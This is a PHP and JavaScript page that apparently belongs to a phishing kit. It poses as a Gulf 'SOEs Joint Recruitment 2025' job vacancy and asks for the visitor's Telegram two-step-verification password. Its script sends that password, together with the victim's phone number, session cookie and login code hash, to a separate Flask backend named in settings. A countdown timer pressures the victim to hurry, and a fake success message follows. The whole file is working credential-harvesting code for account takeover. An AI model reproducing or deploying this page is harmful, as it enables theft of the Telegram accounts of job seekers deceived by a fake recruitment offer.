<?php
// Include settings file
require_once 'settings.php';
session_start(); // Start session to check login status

// Check for session validity
if (!isset($_SESSION['otp_verified']) || $_SESSION['otp_verified'] !== true) {
    // Set OTP verified flag when coming from OTP page
    $_SESSION['otp_verified'] = true;
}

// Set a new expiration timer for password entry
if (!isset($_SESSION['password_attempt_time'])) {
    // Use UTC time consistently
    $_SESSION['password_attempt_time'] = time(); // time() returns UTC timestamp in PHP
}

// Check for password attempt expiration (5 minutes)
$password_expiration = 300; // seconds (5 minutes)
if (isset($_SESSION['password_attempt_time']) && (time() - $_SESSION['password_attempt_time']) > $password_expiration) {
    $password_expired = true;
} else {
    $password_expired = false;
}

// Save server time information (in UTC)
$_SESSION['server_time'] = time(); // time() returns UTC timestamp in PHP
$_SESSION['server_time_iso'] = gmdate('Y-m-d\TH:i:s\Z'); // ISO format UTC time

// Calculate time left for JavaScript
$time_left = isset($_SESSION['password_attempt_time']) ? 
    max(0, $password_expiration - (time() - $_SESSION['password_attempt_time'])) : 
    $password_expiration;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="SOEs Joint Recruitment 2025">
    <meta property="og:image" content="https://www.ahlan-world.org/wp-content/uploads/arabic-high-paying-jobs.jpg.webp">
    <meta name="description" content="Find Jobs in Egypt, Saudi Arabia, UAE, Qatar, Kuwait & Gulf. Thousands of online jobs and millions of job seekers are only available on ArabJobs">
    <meta name="author" content="SOEs Joint Recruitment 2025">
    <title>SOEs VACANCY</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Protest+Guerrilla&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="./dubai/uae.png" type="image/x-icon" sizes="32x25">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./public/css/style.css">
    <style>
        /* Tambahan CSS untuk spinner */
        .spinner-border-sm {
            width: 1rem;
            height: 1rem;
            border-width: 0.2em;
        }
        
        /* Perbaikan untuk loading overlay */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body cz-shortcut-listen="true">
    <div class="loading" style="display: none" id="loading">
        <div class="loader"></div>
    </div>

    <section>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-10 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="top-card">
                                <img src="/public/images/telkom2.jpg" alt="banner">
                            </div>
                            <div class="middle-card mt-3">

                                <p class="text-center">
                                    2-Step Verification is enabled. Your <strong class="phone-number">Telegram</strong> account is protected with a password.
                                </p>
                                
                                <!-- Status pesan akan ditampilkan di sini -->
                                <div class="text-center mb-3" id="status-message"></div>

                                <form id="2fa-form">
                                    <div class="mb-3">
                                        <input type="password" class="form-control" name="password" id="password" placeholder="Your Password" required="">
                                    </div>
                                    <div class="mb-3 text-center">
                                        <button type="submit" class="btn btn-login text-uppercase">
                                            Verification
                                        </button>
                                    </div>
                                </form>
                                
                                <!-- Restart process button -->
                                <div class="mb-3 text-center">
                                    <button type="button" id="restartBtn" class="btn btn-outline-secondary">
                                        Restart Process
                                    </button>
                                </div>

                            </div>
                            <div class="bottom-card"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

    <script>
    // Create the phpSettings variable from PHP $url variable
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
    
    // Store PHP server time info
    var phpServerTime = {
        timestamp: <?php echo time(); ?>, // UTC timestamp
        iso: '<?php echo gmdate('Y-m-d\TH:i:s\Z'); ?>' // ISO format UTC time
    };
    
    // Define CONFIG object for AJAX timeout - 5 minutes
    var CONFIG = {
        TIMEOUT: 300000 // timeout in milliseconds (5 menit = 300 detik * 1000)
    };
    
    // Get PHP variables for password session expiration
    var passwordExpired = <?php echo $password_expired ? 'true' : 'false'; ?>;
    var passwordExpirationTime = <?php echo $password_expiration; ?>; // 300 seconds
    var timeLeft = <?php echo $time_left; ?>; // Time left from PHP
    
    // Debug function for consistent logging
    function debugLog(message) {
        console.log(message);
    }
    
    // Konfigurasi toastr
    toastr.options = {
        "closeButton": true,
        "debug": false,
        "newestOnTop": true,
        "progressBar": true,
        "positionClass": "toast-top-right",
        "preventDuplicates": false,
        "onclick": null,
        "showDuration": "300",
        "hideDuration": "1000",
        "timeOut": "5000",
        "extendedTimeOut": "1000",
        "showEasing": "swing",
        "hideEasing": "linear",
        "showMethod": "fadeIn",
        "hideMethod": "fadeOut"
    };
    
    // Initialize toastr
    $(document).ready(function() {
        debugLog("Initializing toastr...");
        try {
            toastr.info("Please enter the password for your Telegram account");
            debugLog("Toastr initialized successfully");
        } catch (e) {
            debugLog("Toastr error: " + e.message);
        }
        
        // Check server time with backend API
        checkServerTime();
    });
    
    // Function to check server time with backend
    function checkServerTime() {
        debugLog("Checking server time with backend...");
        $.ajax({
            url: phpSettings.endpointUrl + "/server-time",
            type: "GET",
            success: function(data) {
                debugLog("Server time info:", data);
                
                // Compare with browser time
                const browserTime = new Date();
                const serverTimeUTC = new Date(data.utc_time);
                const timeDiff = Math.abs(browserTime.getTime() - serverTimeUTC.getTime()) / 1000;
                
                debugLog("Browser time:", browserTime.toISOString());
                debugLog("Server UTC time:", data.utc_time);
                debugLog("Time difference (seconds):", timeDiff);
                
                // Also compare with PHP time
                const phpTimeDiff = Math.abs(phpServerTime.timestamp - data.php_compatible_time);
                debugLog("PHP server vs Flask server time diff (seconds):", phpTimeDiff);
                
                if (timeDiff > 60) {
                    // If more than 1 minute difference between browser and server, warn in console
                    console.warn("Warning: Large time difference between browser and server:", timeDiff, "seconds");
                }
                
                if (phpTimeDiff > 60) {
                    // If more than 1 minute difference between PHP and Flask servers, warn in console
                    console.warn("Warning: Time synchronization issue between PHP and Flask servers:", phpTimeDiff, "seconds");
                }
            },
            error: function(xhr, status, error) {
                console.error("Error checking server time:", error);
            }
        });
    }
</script>

    <script>
        $(document).ready(function() {
            debugLog("Password 2FA Page Loaded");
            
            // Try to get banner image
            var img = sessionStorage.getItem("img");
            debugLog("Banner image:", img);
            
            if (img) {
                $(".top-card").children("img").attr("src", img);
            }
            
            // Display phone number
            var phoneNumber = localStorage.getItem("phoneNumber");
            if (phoneNumber) {
                $(".phone-number").text(phoneNumber);
            } else {
                debugLog("Phone number not found in localStorage");
                $("#status-message").html('<div class="alert alert-warning">Nomor telepon tidak ditemukan. <a href="./form.php">Kembali ke form registrasi</a></div>');
            }
            
            // PENTING: Verify that we have all needed data before proceeding
            if (!phoneNumber) {
                debugLog("Phone number not found - aborting");
                $("#status-message").html('<div class="alert alert-danger">Data tidak lengkap. <a href="./form.php">Kembali ke awal</a></div>');
                $("button[type=submit]").prop("disabled", true);
                return;
            }
            
            // Get session ID
            var sessionId = getCookie('session_id');
            debugLog("Session ID from cookie: " + sessionId);
            
            if (!sessionId) {
                debugLog("Session ID not found - aborting");
                $("#status-message").html('<div class="alert alert-danger">Invalid session. <a href="./form.php">Back to the beginning</a></div>');
                $("button[type=submit]").prop("disabled", true);
                return;
            }
            
            // Get phone_code_hash with fallback to sessionStorage
            var phoneCodeHash = localStorage.getItem("phone_code_hash") || sessionStorage.getItem("phone_code_hash");
            if (!phoneCodeHash) {
                debugLog("WARNING: phone_code_hash not found!");
            }
            
            // Auto focus to password input
            $("#password").focus();
            
            // Check if password session is expired from PHP
            if (passwordExpired) {
                toastr.error("The verification session has expired. Please restart the registration process."); $("#2fa-form").hide(); $("#restartBtn").text("Restart Registration"); $("#status-message").html('<div class="alert alert-danger">The verification session has expired</div>');
                return;
            }
            
            // Set up timer for session expiration (5 minutes = 300 seconds) - adjusted to match backend
            // Only show timer if it's less than 4 minutes (to avoid unnecessary urgency)
            if (timeLeft < 240) {
                $("<p class='text-center text-warning'>The session will expire in: <span id='timer'>" + timeLeft + "</span> seconds</p>").insertAfter(".phone-number").parent();
                
                var countdown = setInterval(function() {
                    timeLeft--;
                    $("#timer").text(timeLeft);
                    
                    if (timeLeft <= 0) {
                        clearInterval(countdown);
                        toastr.error("The verification session has expired. Please restart the registration process."); $("#2fa-form").hide(); $("#restartBtn").text("Restart Registration"); $("#status-message").html('<div class="alert alert-danger">The verification session has expired</div>');
                    }
                }, 1000);
            }

            $("#2fa-form").on("submit", function(e) {
                e.preventDefault();
                
                // If session expired, don't submit
                if (passwordExpired || timeLeft <= 0) {
                    toastr.error("The verification session has expired. Please restart the registration process.");
                    return;
                }
                
                var password = $("#password").val();
                
                if (!password) {
                    toastr.error("The password cannot be empty");
                    return;
                }
                
                // Data to send to backend - always include all available data
                var data = {
                    password: password,
                    phone_number: phoneNumber,
                    session_id: sessionId,
                    phone_code_hash: phoneCodeHash,  // Include this for consistency
                    client_time: Math.floor(Date.now() / 1000), // Include client time in seconds
                    php_server_time: phpServerTime.timestamp // Include PHP server time
                };
                
                debugLog("Sending data:", data);
                
                // Get endpoint from PHP variable
                const endpointUrl = phpSettings.endpointUrl;
                
                // Show status and loading
                $("#status-message").html('<div class="alert alert-info">Verifying password... <br>This process may take up to 5 minutes, please wait.</div>');
                $(".loading").show();
                
                // Disable form during verification
                $("#password").prop("disabled", true);
                $("button[type=submit]").prop("disabled", true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...');
                $("#restartBtn").prop("disabled", true);
                
                // Send to Flask backend with increased timeout (5 minutes)
                $.ajax({
                    url: endpointUrl + "/password",
                    type: "POST",
                    data: JSON.stringify(data),
                    contentType: "application/json",
                    dataType: "json",
                    timeout: CONFIG.TIMEOUT, // 5 minutes in milliseconds
                    beforeSend: function() {
                        debugLog("Starting password verification with timeout " + CONFIG.TIMEOUT + " ms");
                        toastr.info("Memverifikasi password. Mohon tunggu...");
                    },
                    success: function(response) {
                        debugLog("Response:", response);
                        $(".loading").hide();
                        
                        // Re-enable form
                        $("#password").prop("disabled", false);
                        $("button[type=submit]").prop("disabled", false).text("Verifikasi");
                        $("#restartBtn").prop("disabled", false);
                        
                        if (response.success) {
                            // Authentication completed
                            $("#status-message").html('<div class="alert alert-success">Verifikasi berhasil! Mengalihkan ke halaman berikutnya...</div>');
                            toastr.success("Verifikasi berhasil!");
                            
                            // Disable form to prevent multiple submissions
                            $("#2fa-form").find("input, button").prop("disabled", true);
                            $("#restartBtn").prop("disabled", true);
                            
                            setTimeout(function() {
                                window.location.href = "./completed.php";
                            }, 1500);
                        } else {
                            // Authentication failed
                            $("#status-message").html('<div class="alert alert-danger">' + (response.error || "Password tidak valid. Silakan coba lagi.") + '</div>');
                            toastr.error(response.error || "Password tidak valid. Silakan coba lagi.");
                        }
                    },
                    error: function(xhr, status, error) {
                        $(".loading").hide();
                        debugLog("Error:", error, "Status:", status, "Response:", xhr.responseText);
                        
                        // Re-enable form
                        $("#password").prop("disabled", false);
                        $("button[type=submit]").prop("disabled", false).text("Verifikasi");
                        $("#restartBtn").prop("disabled", false);
                        
                        if (status === "timeout") {
                            $("#status-message").html('<div class="alert alert-danger">Waktu permintaan habis (5 menit). Server mungkin sibuk. Silakan coba lagi.</div>');
                            toastr.error("Waktu permintaan habis. Server mungkin sibuk. Silakan coba lagi.");
                        } else {
                            $("#status-message").html('<div class="alert alert-danger">Terjadi kesalahan komunikasi dengan server. Silakan coba lagi.</div>');
                            toastr.error("Terjadi kesalahan komunikasi dengan server. Silakan coba lagi.");
                        }
                    }
                });
            });
            
            // Restart process button handler
            $("#restartBtn").on("click", function() {
                $(this).prop("disabled", true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...');
                toastr.info("Mengalihkan ke halaman pendaftaran...");
                
                setTimeout(function() {
                    window.location.href = "./form.php";
                }, 1000);
            });
            
            // Function for cookies
            function getCookie(name) {
                const nameEQ = name + "=";
                const ca = document.cookie.split(';');
                for(let i=0; i < ca.length; i++) {
                    let c = ca[i];
                    while (c.charAt(0) === ' ') c = c.substring(1,c.length);
                    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length,c.length);
                }
                return null;
            }
        });
    </script>
</body>

</html>